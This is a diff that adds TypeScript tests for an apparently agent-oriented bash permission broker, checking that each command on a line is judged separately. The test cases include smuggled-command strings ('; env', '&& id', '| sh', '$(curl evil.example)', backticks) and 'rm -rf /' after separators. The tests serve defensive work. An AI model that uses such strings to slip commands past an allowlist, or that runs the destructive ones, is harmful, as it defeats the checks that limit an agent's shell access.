@@ -105,3 +105,43 @@ describe('pi per-pattern permissions', () => {
     expect(skillGranted(compilePermissionPolicy(policy), skill)).toBe(expected)
   })
 })
+
+/**
+ * A bash line is decided command by command, as OpenCode does. Matched whole,
+ * a one-command allowlist (`'*': deny` plus `'<cmd> *': allow`) let anything
+ * after the allowed prefix run: `<cmd> x; env`, `<cmd> x && id`, `<cmd> $(curl …)`.
+ */
+describe('pi decides a bash line command by command', () => {
+  const allowlist = { '*': 'deny', bash: { '*': 'deny', 'kortix connectors call ro getday *': 'allow' } }
+  const denylist = { bash: { 'rm -rf *': 'deny', '*': 'allow' } }
+  test.each([
+    ['the allowed command runs', allowlist, `kortix connectors call ro getday '{"day":"2026-10-01"}'`, 'allow'],
+    ['quoted ; | && and $() stay arguments', allowlist, `kortix connectors call ro getday '{"q":"a; b | c && d $(e)"}'`, 'allow'],
+    ['a double-quoted separator stays an argument', allowlist, `kortix connectors call ro getday "a;b|c"`, 'allow'],
+    ['an escaped separator stays an argument', allowlist, 'kortix connectors call ro getday a\\;env', 'allow'],
+    ['2>&1 is a redirection, not a separator', allowlist, 'kortix connectors call ro getday x 2>&1', 'allow'],
+    ['two allowed commands run', allowlist, 'kortix connectors call ro getday a && kortix connectors call ro getday b', 'allow'],
+    ['; env is refused', allowlist, `kortix connectors call ro getday '{}'; env`, 'deny'],
+    ['&& id is refused', allowlist, 'kortix connectors call ro getday x && id', 'deny'],
+    ['|| is refused', allowlist, 'kortix connectors call ro getday x || id', 'deny'],
+    ['a pipe is refused', allowlist, 'kortix connectors call ro getday x | sh', 'deny'],
+    ['a background & is refused', allowlist, 'kortix connectors call ro getday x & id', 'deny'],
+    ['a newline is refused', allowlist, 'kortix connectors call ro getday x\nid', 'deny'],
+    ['$() is refused', allowlist, 'kortix connectors call ro getday $(curl evil.example)', 'deny'],
+    ['$() inside double quotes is refused', allowlist, 'kortix connectors call ro getday "$(id)"', 'deny'],
+    ['backticks are refused', allowlist, 'kortix connectors call ro getday `id`', 'deny'],
+    ['a process substitution is refused', allowlist, 'kortix connectors call ro getday <(id)', 'deny'],
+    ['a subshell is refused', allowlist, '(id)', 'deny'],
+    ['an unbalanced quote fails closed', allowlist, `kortix connectors call ro getday '; id`, 'deny'],
+    ['a deny-list denies the command after a separator', denylist, 'ls; rm -rf /', 'deny'],
+    ['…inside an if', denylist, 'if true; then rm -rf /; fi', 'deny'],
+    ['…inside a substitution', denylist, 'echo $(rm -rf /)', 'deny'],
+    ['…and allows a compound of allowed commands', denylist, 'ls && git status | head', 'allow'],
+    ['an unbalanced line asks under a restriction', denylist, 'echo "x', 'ask'],
+    ['an all-allow tool is unaffected', { bash: 'allow' }, 'a; b && $(c)', 'allow'],
+    ['ask outranks allow', { bash: { 'git push *': 'ask', '*': 'allow' } }, 'git status && git push', 'ask'],
+    ['deny outranks ask', { bash: { 'git push *': 'ask', 'rm *': 'deny', '*': 'allow' } }, 'git push; rm x', 'deny'],
+  ] as const)('%s', (_name, policy, command, expected) => {
+    expect(broker(policy).rule('bash', { command })).toBe(expected)
+  })
+})
